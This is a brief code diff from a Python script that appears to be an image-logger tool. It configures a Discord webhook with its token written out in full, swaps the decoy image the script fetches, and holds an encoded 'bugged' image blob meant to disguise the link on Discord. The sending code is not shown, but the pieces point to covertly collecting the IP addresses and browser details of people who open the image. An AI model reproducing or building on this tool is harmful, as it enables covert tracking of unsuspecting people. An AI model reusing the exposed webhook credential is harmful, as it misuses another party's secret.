@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1475899778218066022/JNBtWNgzpUUXN84N8fGXUC9g1znX6Jd9foZYz3PF4-VCdg-fgrlwi6EFX9ZtHjMqURi1'
 
-bindata = httpx.get('https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png?resize=1024%2C767&quality=50&strip=all').content
+bindata = httpx.get('https://www.pcworld.com/wp-content/uploads/2025/04/windows-10-logo-onscreen-100809733-orig-4.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
